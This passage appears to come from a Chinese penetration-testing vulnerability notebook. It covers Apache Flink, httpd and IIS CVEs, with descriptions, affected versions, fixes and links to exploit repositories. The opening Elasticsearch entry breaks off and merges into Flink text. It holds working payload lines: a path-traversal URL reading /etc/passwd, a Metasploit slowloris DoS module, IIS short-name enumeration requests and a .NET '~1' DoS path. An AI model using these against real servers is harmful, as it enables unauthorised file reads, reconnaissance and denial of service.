- 描述
    CVE-2014-3120 后，ElasticSearch 默认的动态脚本语言换成了 Groovy，并增加了沙盒，但默认仍然支持直接执行动态语言。
- 影响版本
    - ElasticSearch  官网 : https://flink.apache.org/
> Fofa: app="APACHE-Flink"
**CVE-2020-17518 文件写入**
- 相关文章
    - [CVE-2020-17518&17519：Flink两个漏洞复现](https://mp.weixin.qq.com/s/9xLQ1YAWVtHBv9qVk-Xc1A)
- POC | Payload | exp
    - https://github.com/QmF0c3UK/CVE-2020-17518.git
**CVE-2020-17519 文件读取**
- 相关文章
    - [漏洞复现|Apache Flink(CVE-2020-17519)漏洞分析](https://mp.weixin.qq.com/s/6Z7ilX_bwSBU8EWfStAc5w)
- POC | Payload | exp
    ```
    http://your-ip:8081/jobmanager/logs/..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252fetc%252fpasswd
    ```
---
### httpd
**CVE-2007-6750 Apache ddos**
- 描述
    Apache HTTP Server 1.x版本和2.x版本中存在资源管理错误漏洞。该漏洞源于网络系统或产品对系统资源（如内存、磁盘空间、文件等）的管理不当。
- MSF Module
    ```
    use auxiliary/dos/http/slowloris
    set RHOST 
    run
    ```
**CVE-2017-15715 Apache 解析漏洞**
- 影响版本
    - 2.4.0 < HTTPD <2.4.29
- 相关文章
    - [利用最新Apache解析漏洞（CVE-2017-15715）绕过上传黑名单](https://www.leavesongs.com/PENETRATION/apache-cve-2017-15715-vulnerability.html)
    - [Apache HTTPD 换行解析漏洞（CVE-2017-15715）](https://vulhub.org/#/environments/httpd/CVE-2017-15715/)
**SSI 远程命令执行漏洞**
- 相关文章
    - [Apache SSI 远程命令执行漏洞](https://vulhub.org/#/environments/httpd/ssi-rce/)
**CVE-2019-0211 Apache HTTP 服务组件提权漏洞**
- 相关文章
    - [Apache 提权漏洞(CVE-2019-0211)复现](https://paper.seebug.org/889/)
- POC | Payload | exp
    - [CVE-2019-0211-apache](https://github.com/cfreal/exploits/tree/master/CVE-2019-0211-apache)
**CVE-2021-40438**
- 相关文章
    - [【最新漏洞预警】CVE-2021-40438-Apache httpd mod_proxy SSRF漏洞深入分析与复现](https://mp.weixin.qq.com/s/tYM6z9S1WZjPjfCt2MHOAQ)
    - [Apache mod_proxy SSRF（CVE-2021-40438）的一点分析和延伸](https://mp.weixin.qq.com/s/sbFs7kZ8tExwZPeUvq1hJw)
- POC | Payload | exp
    - [Apache CVE-2021-40438](https://www.o2oxy.cn/3750.html)
**CVE-2021-41773 Apache HTTP Server 路径穿越漏洞**
- 相关文章
    - [CVE-2021-41773-Apache HTTP Server 路径穿越漏洞快速分析与复现](https://mp.weixin.qq.com/s/XEnjVwb9I0GPG9RG-v7lHQ)
**CVE-2021-42013 Apache任意文件读取补丁绕过**
- 相关文章
    - [Apache任意文件读取补丁绕过（CVE-2021-42013）](https://mp.weixin.qq.com/s/UzKu4mze02umEhxJAJpp9g)
    - [Apache2.4.50 CVE-2021-41773 cve-2021-42013 复现](https://www.o2oxy.cn/3740.html)
---
### IIS
**相关文章**
- [Let's Dance in the Cache - Destabilizing Hash Table on Microsoft IIS!](https://blog.orange.tw/2022/08/lets-dance-in-the-cache-destabilizing-hash-table-on-microsoft-iis.html)
**IIS shortname**
- 描述
    windows 在创建一个新文件时,操作系统还会生成 8.3 格式的兼容 MS-DOS 的(短)文件名,以允许基于 MS-DOS 或16位 windows 的程序访问这些文件.
- 修复方案
    1. 升级 .net framework 至 4.0 版本或以上
    2. 修改 HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\FileSystem 值 NtfsDisable8dot3NameCreation 为 1
- 相关文章
    - [IIS短文件名漏洞](http://www.lonelyor.org/lonelyorWiki/15446866501207.html)
    - [IIS短文件名泄露漏洞修复](https://segmentfault.com/a/1190000006225568)
    - [IIS短文件/文件夹漏洞(汇总整理) ](https://www.freebuf.com/articles/4908.html)
    - [红队第7篇：IIS短文件名猜解在拿权限中的巧用，付脚本下载](https://mp.weixin.qq.com/s/N30pLGhwWJcNB90q9QOg1g)
- POC | Payload | exp
    ```bash
    1. http://www.xxx.com/*~1*/.aspx
    2. http://www.xxx.com/l1j1e*~1*/.aspx
    # 若1返回404而2返回400,则可以判断目标站点存在漏洞.
    http://www.xxx.com/a*~1*/.aspx
    # 若存在将返回404,不存在则返回400.以此类推,不断向下猜解所有的6个字符.
    ```
    ```
    Windows Server 2008 R2
    查询是否开启短文件名功能:fsutil 8dot3name query
    关闭该功能:fsutil 8dot3name set 1
    Windows Server 2003
    关闭该功能:fsutil behavior set disable8dot3 1
    ```
    - [lijiejie/IIS_shortname_Scanner](https://github.com/lijiejie/IIS_shortname_Scanner)
    - [irsdl/IIS-ShortName-Scanner](https://github.com/irsdl/IIS-ShortName-Scanner)
**.Net Framework 拒绝服务攻击**
- 描述
    当请求文件夹名称包含 `~1` 的请求,会导致不存在该文件的 .Net Framework 去递归查询所有根目录.如果只有一个"~1"是无效的,当"~1"大于一个,比如像这样:
    `/wwwtest/fuck~1/~1/~1/~1.aspx`
    此时文件系统会这样调用:
    ```
    \wwwtest                           SUCCESS
    \wwwtest\fuck~1\~1\~1\~1           PATH NOT FOUND
    \wwwtest\fuck~1                    NAME NOT FOUND
    \wwwtest\fuck~1\~1\                PATH NOT FOUND
    \wwwtest\fuck~1\~1\~1\             PATH NOT FOUND
    \wwwtest\fuck~1\~1\~1\~1.aspx      PATH NOT FOUND
    \wwwtest\fuck~1\~1\~1\~1.aspx      PATH NOT FOUND
    \wwwtest\fuck~1\~1\~1              PATH NOT FOUND
    \wwwtest\fuck~1\~1\~1\~1.aspx      PATH NOT FOUND
    \wwwtest\fuck~1\~1\~1              PATH NOT FOUND
    \wwwtest\fuck~1\~1                 PATH NOT FOUND
    \wwwtest\fuck~1                    NAME NOT FOUND
    \wwwtest                           SUCCESS
    \wwwtest                           SUCCESS
    ```
    如果我们请求的文件/文件夹名同时存在大小写时,这个请求会被请求两次,一次是原封不动的请求,一次是全部使用小写的请求.
    下表显示了每个请求的 FS 调用的数量(Windows 2008 R2, IIS 7.5(latest patch - June 2012), and .Net framework 4.0.30319 (在别的系统下可能会不同))
**CVE-2017-7269** IIS6.0 RCE
- 描述
    CVE-2017-7269 是 IIS 6.0 中存在的一个栈溢出漏洞，在 IIS6.0 处理 PROPFIND 指令的时候，由于对 url 的长度没有进行有效的长度控制和检查，导致执行 memcpy 对虚拟路径进行构造的时候，引发栈溢出，该漏洞可以导致远程代码执行。
- 影响版本
    - IIS 6.0
    - win 2003-r2
- 相关文章
    - [CVE-2017-7269 IIS6.0远程代码执行漏洞分析及Exploit](https://paper.seebug.org/259/)
- POC | Payload | exp
    - [zcgonvh/cve-2017-7269](https://github.com/zcgonvh/cve-2017-7269)